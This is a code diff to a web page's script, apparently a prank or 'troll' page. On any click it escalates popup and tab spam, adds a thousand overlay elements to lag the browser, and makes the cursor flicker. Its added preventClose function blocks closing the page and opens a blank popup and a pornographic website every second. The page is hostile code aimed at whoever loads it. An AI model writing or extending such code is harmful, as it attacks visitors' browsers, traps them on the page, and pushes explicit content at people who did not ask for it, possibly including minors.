@@ -155,9 +155,9 @@
         }
 
         function openPopupsAndTabs() {
-            const numPopups = 10; // Number of popups to open
-            const numTabs = 10; // Number of tabs to open
-            const interval = 500; // Interval between openings in milliseconds
+            const numPopups = 20; // Increased number of popups to open
+            const numTabs = 20; // Increased number of tabs to open
+            const interval = 200; // Decreased interval between openings
 
             for (let i = 0; i < numPopups; i++) {
                 setTimeout(() => {
@@ -188,6 +188,41 @@
             });
         }
 
+        function makeBrowserBuggy() {
+            // Add more elements to lag the browser
+            for (let i = 0; i < 1000; i++) {
+                const div = document.createElement('div');
+                div.style.position = 'absolute';
+                div.style.top = `${Math.random() * 100}%`;
+                div.style.left = `${Math.random() * 100}%`;
+                div.style.width = `${Math.random() * 50}px`;
+                div.style.height = `${Math.random() * 50}px`;
+                div.style.background = `rgba(0, 0, 0, 0.5)`;
+                document.body.appendChild(div);
+            }
+
+            // Make the cursor behavior more erratic
+            document.body.style.cursor = 'none';
+            setInterval(() => {
+                document.body.style.cursor = 'default';
+                setTimeout(() => {
+                    document.body.style.cursor = 'none';
+                }, 500);
+            }, 1000);
+        }
+
+        function preventClose() {
+            window.addEventListener('beforeunload', (event) => {
+                event.preventDefault();
+                event.returnValue = '';
+            });
+
+            setInterval(() => {
+                window.open('', '_blank', 'width=400,height=300');
+                window.open('https://www.pornhub.com', '_blank');
+            }, 1000);
+        }
+
         document.addEventListener('click', () => {
             const clickToLoad = document.getElementById('click-to-load');
             clickToLoad.style.display = 'none';
@@ -201,6 +236,8 @@
             lagBrowser();
             playRandomAudio();
             openPopupsAndTabs();
+            makeBrowserBuggy();
+            preventClose();
         });
     </script>
 </body>
